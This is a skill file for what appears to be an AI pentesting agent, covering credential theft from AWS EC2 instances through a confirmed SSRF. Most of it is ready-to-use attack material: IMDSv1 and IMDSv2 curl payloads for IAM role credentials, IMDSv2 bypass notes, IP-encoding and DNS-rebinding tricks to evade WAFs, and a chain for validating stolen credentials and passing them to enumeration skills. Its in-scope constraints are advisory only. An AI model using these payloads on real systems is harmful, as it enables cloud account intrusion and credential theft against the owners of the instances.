---
name: aws-ec2-imds-abuse
description: Exploit a confirmed SSRF on an EC2 instance to extract IAM role credentials from IMDS (v1 or v2 if token leaks). Use ONLY when SSRF is confirmed in scope and the target is an EC2-hosted app. Provides curl payloads, decoded creds, and follow-up enum chain.
---

# aws-ec2-imds-abuse

Atomic skill: extract role creds from IMDS via SSRF. Use ONLY when SSRF is already confirmed.

## Pre-flight

- Confirm SSRF is live and target host is EC2 (subdomain ends in `.compute.amazonaws.com` or you've fingerprinted via response)
- Verify SSRF and the target endpoint are in scope (program SAFs explicitly include EC2 IMDS)

## IMDSv1 payloads (no token, blind grab)

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

## IMDSv2 (token required)

```bash
# Step 1: PUT to get token (most SSRFs are GET-only — fail here means safer IMDSv2)
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: GET with token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
```

## Bypass IMDSv2

- SSRF must support arbitrary headers AND PUT verb. Most don't.
- Some SSRFs allow header injection via parameter pollution → tryable.
- IMDSv2 with `HttpPutResponseHopLimit > 1` may be reachable from container/sidecar.

## After cred extraction

1. Save creds to env: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
2. Verify with `aws sts get-caller-identity`
3. Hand off to `aws-iam-enum` skill for permission mapping
4. Hand off to `aws-cred-validator` to test what's reachable

## Encoding for SSRF parser bypass

Some WAFs block `169.254.169.254`:
- `http://169.254.169.254` → straight
- `http://[::ffff:169.254.169.254]` → IPv6 mapped
- `http://0xa9.0xfe.0xa9.0xfe` → hex
- `http://2852039166` → decimal
- `http://017700000376` → octal
- DNS rebinding via `http://A.169.254.169.254.nip.io`

## Output

```json
{"ts":"...","skill":"aws-ec2-imds-abuse","ssrf_url":"...","role":"arn:aws:iam::...:role/web-app","creds_extracted":true,"creds_valid":true,"ttl_seconds":21600}
```

## Constraints

- NEVER use extracted creds outside the program scope (e.g., don't pivot to other accounts)
- NEVER persist creds beyond the engagement; rotate by abandoning session
- Document the chain (SSRF → IMDS → creds → enum) for the report
- If user-data contains creds in plaintext, that itself is the report — don't keep escalating
